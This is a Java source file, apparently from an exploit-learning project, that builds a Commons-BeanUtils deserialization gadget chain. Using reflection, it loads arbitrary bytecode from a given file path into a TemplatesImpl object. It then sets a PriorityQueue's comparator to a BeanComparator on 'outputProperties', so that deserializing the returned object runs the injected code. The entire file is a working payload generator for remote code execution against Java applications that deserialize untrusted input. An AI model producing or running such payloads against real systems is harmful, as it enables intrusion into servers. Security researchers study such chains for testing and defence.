package com.yyjccc.CommonsExp;


import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xml.internal.security.c14n.helper.AttrCompare;
import com.yyjccc.Utils.Tool;
import org.apache.commons.beanutils.BeanComparator;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ConstantTransformer;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.PriorityQueue;


public class cb {
	public static Object cb(String path) throws Exception {
		//CC3
		TemplatesImpl templates = new TemplatesImpl();
		Class c1=templates.getClass();
		Field namefield = c1.getDeclaredField("_name");
		namefield.setAccessible(true);
		namefield.set(templates,"aaa");
		Field bytecodes=c1.getDeclaredField("_bytecodes");
		bytecodes.setAccessible(true);
		//byte [] code= Files.readAllBytes(Paths.get("D:\\coderesp\\java\\learn\\exp\\target\\classes\\org\\example\\test.class"));
		byte [] code= Files.readAllBytes(Paths.get(path));
		byte[][] codes={code};
		bytecodes.set(templates,codes);
		Field tfactoryfield = c1.getDeclaredField("_tfactory");
		tfactoryfield.setAccessible(true);
		tfactoryfield.set(templates,new TransformerFactoryImpl());

		//CB
		TransformingComparator transformingComparator = new TransformingComparator<>(new ConstantTransformer<>(1));
		BeanComparator objectBeanComparator = new BeanComparator("outputProperties",new AttrCompare());

		//CC2
		PriorityQueue<Object> priorityqueue = new PriorityQueue<>(transformingComparator);
		priorityqueue.add(templates);
		priorityqueue.add(1);
		Class c3 = priorityqueue.getClass();
		Field comparatorfield = c3.getDeclaredField("comparator");
		comparatorfield.setAccessible(true);
		comparatorfield.set(priorityqueue,objectBeanComparator);


	return priorityqueue;
	}
}